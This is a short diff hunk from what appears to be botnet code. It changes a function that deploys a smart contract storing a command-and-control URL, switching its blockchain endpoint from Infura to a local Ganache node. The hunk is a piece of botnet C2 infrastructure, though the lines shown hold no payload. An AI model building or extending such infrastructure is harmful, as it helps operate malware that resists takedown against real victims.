@@ -345,7 +345,7 @@ def update_c2_url_on_blockchain(c2_url):
         logger.warning(f"{CONTRACT_META_FILE} not found. Deploying a new contract.")
         with open('botnet/C2UrlRegistry.sol', 'r') as f:
             solidity_source = f.read()
-        w3 = Web3(Web3.HTTPProvider(INFURA_URL))
+        w3 = Web3(Web3.HTTPProvider(GANACHE_URL))
         contract_interface = compile_contract(solidity_source)
         contract_address = deploy_contract(w3, contract_interface)
         logger.info(f"Contract deployed at: {contract_address}")
